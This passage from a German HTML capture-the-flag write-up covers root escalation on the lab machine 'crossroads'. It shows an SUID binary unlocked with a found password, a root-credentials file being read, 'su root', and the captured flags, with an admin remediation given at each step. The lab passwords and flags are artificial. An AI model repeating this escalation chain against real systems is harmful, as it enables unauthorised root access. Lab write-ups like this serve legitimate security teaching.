+Auflösen des Hostnamens cross.hmv (cross.hmv)… 192.168.2.128
+Verbindungsaufbau zu cross.hmv (cross.hmv)|192.168.2.128|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1100255 (1,0M) [image/png]
+Wird in »crossroads.png« gespeichert.
+
+crossroads.png                100%[=============================>]   1,05M  --.-KB/s    in 0,01s
+
+2022-10-10 12:27:42 (85,6 MB/s) - »crossroads.png« gespeichert [1100255/1100255]
+                    </pre>
+                 </div>
+             </div>
+              <!-- Stegoveritas -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegoveritas -out crossroads crossroads.png</span></div>
+                     <pre>
+ERROR:StegoVeritas:Missing the following required packages: foremost, libexempi3
+ERROR:StegoVeritas:Either install them manually or run 'stegoveritas_install_deps'.
+Running Module: SVImage
++---------------------------+------+
+|        Image Format       | Mode |
++---------------------------+------+
+| Portable network graphics | RGB  |
++---------------------------+------+
+... (Weitere Analyse-Module laufen evtl. noch) ...
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das SUID-Binary `./beroot` wird ausgeführt. Es fragt nach einem Passwort. Das Passwort `<span class="password">lemuel</span>` wird eingegeben. Das Programm gibt dann Anweisungen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Passwort für SUID-Binary gefunden!!** Das Passwort `<span class="password">lemuel</span>` (Herkunft unklar, evtl. "three kings" -> Lemuel B. King?) funktioniert. Das Programm fordert auf, `ls` auszuführen und eine Datei `rootcreds` zu finden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `ls` aus und lies die Datei `rootcreds`.<br><strong>Empfehlung (Admin):</strong> Entferne das SUID-Binary `beroot`. Verwende keine hartcodierten Passwörter oder unsicheren Prüfungen in SUID-Programmen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+albert@crossroads:/home/albert$ <span class="command">./beroot</span>
+enter password for root
+-----------------------
+<span class="command">lemuel</span>
+password: <span class="password">lemuel</span>
+do ls and find root creds
+                     </pre> <!-- Interaktive Eingabe -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `ls` wird ausgeführt, findet die Datei `rootcreds`. Der Inhalt wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Root-Passwort gefunden!!** Die Datei enthält die Zugangsdaten für den Root-Benutzer: Benutzer `root`, Passwort `<span class="password">___drifting___</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle mit `su root` und diesem Passwort zum Root-Benutzer.<br><strong>Empfehlung (Admin):</strong> Ändere das Root-Passwort. Entferne das `beroot`-Binary und die `rootcreds`-Datei.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+albert@crossroads:/home/albert$ <span class="command">ls</span>
+beroot	clear  crossroads.png  rootcreds  smbshare  user.txt
+albert@crossroads:/home/albert$ <span class="command">cat rootcreds</span>
+root
+<span class="password">___drifting___</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su root` wird ausgeführt, um zum Root-Benutzer zu wechseln. Das Passwort `<span class="password">___drifting___</span>` (aus `rootcreds`) wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Wechsel zum Root-Benutzer gelingt. Der Prompt ändert sich zu `root@crossroads:/home/albert#`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Ändere das Root-Passwort. Entferne das `beroot`-Binary und die `rootcreds`-Datei. Korrigiere die SMB- und TFTP-Schwachstellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+albert@crossroads:/home/albert$ <span class="command">su root</span>
+Password: <span class="password">___drifting___</span>
+root@crossroads:/home/albert# <!-- Root Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird ins `/root`-Verzeichnis gewechselt und die Datei `root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">876F96716C3606B09A89F0FA3C1D52EB</span>` wird erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+root@crossroads:/home/albert# <span class="command">cd /root</span>
+root@crossroads:~# <span class="command">ls</span>
+beroot.sh  creds  passwd  root.txt
+root@crossroads:~# <span class="command">cat root.txt</span>
+<span class="password">876F96716C3606B09A89F0FA3C1D52EB</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">876F96716C3606B09A89F0FA3C1D52EB</span></div>
+                 </div>
+                 <!-- User Flag (aus der Zusammenfassung am Ende des Logs) -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/albert/user.txt</div> <!-- Pfad angenommen -->
+                     <div class="flag-value"><span class="password">912D12370BBCEA67BF28B03BCB9AA13F</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 10. Oktober 2022</p>
+    </footer>
+</body>
+</html>
